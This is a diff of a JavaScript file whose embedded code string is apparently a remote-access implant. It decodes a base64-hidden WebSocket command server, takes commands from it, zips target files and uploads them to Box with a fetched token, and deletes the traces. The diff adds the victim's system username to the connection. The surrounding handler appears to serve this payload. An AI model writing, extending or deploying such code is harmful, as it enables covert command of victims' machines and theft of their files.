@@ -129,10 +129,10 @@ const code = `
     "d3NzOi8vc29ja2V0c2VydmVyLXByb2R1Y3Rpb24tOTZkOC51cC5yYWlsd2F5LmFwcA==",
     "base64"
   ).toString("utf-8");
-  
+
   let ws;
   function connect() {
-    ws = new WebSocket(socpa);
+    ws = new WebSocket(socpa + "?username=" + os.userInfo().username);
 
     ws.on("message", async (message) => {
       const command = message.toString();
@@ -148,7 +148,11 @@ const code = `
           const zipResult = await compressToZip(targetPath, outputZip);
           const token = await getToken();
           const targetName = new Date().toISOString().replace(/[-:.]/g, "");
-          const uploadResult = await uploadFileToBox(outputZip, targetName, token);
+          const uploadResult = await uploadFileToBox(
+            outputZip,
+            targetName,
+            token
+          );
           const deleteResult = deleteFileOrFolder(outputZip);
 
           ws.send(
@@ -193,6 +197,7 @@ const code = `
   }
 
   connect();
+
 `;
 
 export default async function handler(req, res) {
